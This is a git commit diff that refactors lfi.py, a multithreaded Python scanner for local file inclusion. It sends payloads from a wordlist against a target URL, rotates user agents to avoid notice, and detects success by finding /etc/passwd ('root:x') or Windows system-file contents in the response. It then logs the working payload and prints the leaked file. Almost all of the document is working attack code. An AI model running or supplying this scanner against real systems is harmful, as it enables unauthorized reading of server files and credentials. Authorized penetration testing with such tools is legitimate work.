507a6586e8724a6d123d006ed4cec01058a6de98
DERELİ <mehmet81_gsss@hotmail.com>
2019-12-09 16:16:46 +0300

    Update lfi.py

--- lfi.py
+++ lfi.py
@@ -1,18 +1,11 @@
 import requests, socket, sys, argparse, random, threading, OpenSSL,time
 from bs4 import BeautifulSoup
+from colorama import Fore, Style, init
 
 
-LFI = [lfi.strip() for lfi in open("lfi.txt")]
+LFI_LISTS = [lfi.strip() for lfi in open("lfi.txt")]
 USERAGENT = [agent.strip() for agent in open('user-agents.txt')]
-zm = time.time()
-
-CYAN = '\033[36m'
-GREEN = '\033[32m'
-YELLOW = '\033[33m'
-BLUE = '\033[34m'
-RED = '\033[31m'
-ENDC = '\033[0m'
-
+TIME = time.time()
 
 
 parse = argparse.ArgumentParser()
@@ -21,52 +14,61 @@ args = parse.parse_args()
 url = args.url
 
 
-def output(put):
-    file = open("output.txt","a+")
-    file.writelines(str(put)+"\n")
+increase_lfi_lists = 0
+class lfi_scanner:
 
+    def __init__(self,host):
+        self.host = host
 
-# SCANNER DEF
-say = 0
-def scanner():
-    global LFI
-    global say
-    global USERAGENT
-    say += 1
-    try:
-        req = requests.get(url+LFI[say],headers={'User-Agent':random.choice(USERAGENT)})
-        req_Text = req.text
-        if "root:x" in req_Text:
-            print(RED + "LFI BULUNDU ==>" + LFI[say]+BLUE)
-            output(str("payload["+str(say)+"] "+LFI[say]))
-            print(req_Text)
+    def output(self,put):
+        file = open("output.txt", "a")
+        file.writelines(str(put) + "\n")
 
-        else:
+    def scans(self):
+        global increase_lfi_lists
+        global LFI_LISTS
+        global USERAGENT
+        increase_lfi_lists +=1
+        try:
+            req = requests.get(url + LFI_LISTS[increase_lfi_lists], headers={'User-Agent': random.choice(USERAGENT)}, timeout=2)
+            req_Text = req.text
+            if "root:x" in req_Text or \
+                    "noexecute=optout" in req_Text or \
+                    "OC_INIT_COMPONENT" in req_Text or \
+                    "C:\WINDOWS\system32\Setup\iis.dll" in req_Text:
+                print(Fore.RED + "LFI BULUNDU ==>" + req.url + Style.RESET_ALL)
+                lfi_scanner(url).output(str("payload[" + str(increase_lfi_lists) + "] " + LFI_LISTS[increase_lfi_lists]) + "---" + str(req.url))
+                print(req_Text)
+                sys.exit()
+            print(req.url)
+        except requests.exceptions.ConnectionError:
+            pass
+        except OpenSSL.SSL.Error:
+            pass
+        except requests.exceptions.Timeout:
             pass
 
-        print(req.url + " -- status_code:" + str(req.status_code) + "-- Lenght: "+str(len(req_Text)))
-    except requests.exceptions.ConnectionError:
-        pass
-    except OpenSSL.SSL.Error:
-        pass
 
-
-
-# THREAD
 thread = []
-for thr in range(len(LFI)-1):
-    t1 = threading.Thread(target=scanner)
+p1 = lfi_scanner(url)
+for thr in range(len(LFI_LISTS)-1):
+    t1 = threading.Thread(target=p1.scans)
+    t1.daemon = True
     thread.append(t1)
 
 for thr1 in thread:
     thr1.start()
-    time.sleep(0.03)
+    #time.sleep(0.005)
 
 for thr2 in thread:
     thr2.join()
 
-zaman = time.time() - zm
-print("Geçen süre: "+str(zaman))
+now_time = time.time() - TIME
+print("Geçen süre: "+str(now_time))
+sys.exit()
+
+
+
 
 
 
